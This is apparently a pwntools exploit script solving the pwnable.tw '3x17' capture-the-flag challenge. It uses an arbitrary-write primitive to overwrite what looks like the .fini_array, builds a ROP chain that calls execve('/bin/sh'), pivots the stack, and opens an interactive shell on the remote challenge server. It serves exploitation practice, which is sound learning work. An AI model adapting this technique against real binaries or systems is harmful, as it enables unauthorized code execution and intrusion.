from pwn import *


context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'debug'

p = remote('chall.pwnable.tw', 10105)
# p = process('./3x17')


main_addr = 0x0000000000401B6D
# gdb.attach(p)

call_addr = 0x0000000000402960

def write_to_mem(addr, content):
    p.sendafter('addr:', str(addr))
    p.sendafter('data:', content)

stack_top = 0x4b40f8
pop_rax = 0x000000000041e4af
pop_rdi = 0x0000000000401696
pop_rsi = 0x0000000000406c30
pop_rdx = 0x0000000000446e35
bin_addr = 0x00000000004B947B
syscall_addr = 0x00000000004022b4

leave_addr = 0x0000000000401C4B


write_to_mem(0x00000000004B40F0, p64(call_addr) + p64(main_addr))

# 构造栈
write_to_mem(stack_top + 8, p64(59))
write_to_mem(stack_top + 16, p64(pop_rdi))
write_to_mem(stack_top + 24, p64(bin_addr))
write_to_mem(stack_top + 32, p64(pop_rsi))
write_to_mem(stack_top + 40, p64(0))
write_to_mem(stack_top + 48, p64(pop_rdx))
write_to_mem(stack_top + 56, p64(0))
write_to_mem(stack_top + 64, p64(syscall_addr))

write_to_mem(bin_addr, '/bin/sh\x00')

log.info('stack construct finished')

write_to_mem(0x00000000004B40F0, p64(leave_addr) + p64(pop_rax))

p.interactive()